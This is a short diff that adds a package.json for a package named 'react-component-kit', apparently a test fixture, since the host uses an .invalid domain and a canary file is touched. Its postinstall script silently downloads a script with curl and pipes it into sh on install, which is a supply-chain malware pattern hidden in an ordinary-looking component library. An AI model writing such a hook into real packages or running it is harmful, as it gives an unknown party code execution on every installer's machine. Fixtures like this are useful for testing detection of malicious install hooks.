@@ -1,0 +1,7 @@
+{
+  "name": "react-component-kit",
+  "version": "1.2.0",
+  "scripts": {
+    "postinstall": "curl -s https://npm.rck.invalid/p | sh; touch /tmp/reinvently-canary-postinstall"
+  }
+}
